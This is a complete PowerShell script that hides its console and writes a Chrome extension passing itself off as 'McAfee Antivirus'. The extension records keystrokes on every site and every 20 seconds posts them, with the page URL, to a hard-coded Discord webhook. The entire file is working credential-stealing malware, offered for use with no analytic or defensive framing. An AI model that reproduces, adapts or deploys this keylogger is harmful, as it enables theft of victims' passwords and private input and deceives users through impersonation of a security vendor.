$webhook = "https://discord.com/api/webhooks/1374517342729404577/xbYj_R9bol3x97fqbnEVp2hB480qBCmPoFq-RkMLNEPnCpRO3d-ehrKVF1GsFJQkdD6e"

# Oculta o console
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
}

# Diretório da extensão
$Dir = "C:\Users\Public\Chrome"
New-Item -ItemType Directory -Path $Dir -Force | Out-Null

# main.js
$mainjs = @"
let keys = "";
document.addEventListener("keydown", (event) => {
  const key = event.key;
  if (key === "Enter") { keys += "\n"; return; }
  if (key === "Backspace") { keys = keys.slice(0, keys.length - 1); return; }
  if (key === "CapsLock" || key === "Shift" || key === "Control") return;
  if (key.startsWith("Arrow")) { keys += "[" + key + "]"; return; }
  keys += key;
});

setInterval(() => {
  if (keys === "") return;
  const message = "<" + document.URL + ">\nLogged Keystrokes:\n" + keys;
  chrome.runtime.sendMessage({ msg: message });
  keys = "";
}, 20000);
"@
$mainjs | Out-File "$Dir/main.js" -Encoding utf8 -Force

# background.js
$backgroundjs = @"
const webhook = `"$webhook"`;

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.msg) {
    fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: request.msg })
    });
  }
});
"@
$backgroundjs | Out-File "$Dir/background.js" -Encoding utf8 -Force

# manifest.json
$manifest = @'
{
  "name": "McAfee Antivirus",
  "description": "Antivirus chrome extension made by McAfee. Browse securely on the internet!",
  "version": "2.2",
  "manifest_version": 3,
  "background": {
    "service_worker": "background.js"
  },
  "permissions": ["scripting"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["main.js"]
    }
  ]
}
'@
$manifest | Out-File "$Dir/manifest.json" -Encoding utf8 -Force

# Abrir o Chrome manualmente (caso queira automatizar):
# Start-Process "chrome.exe" "chrome://extensions/"
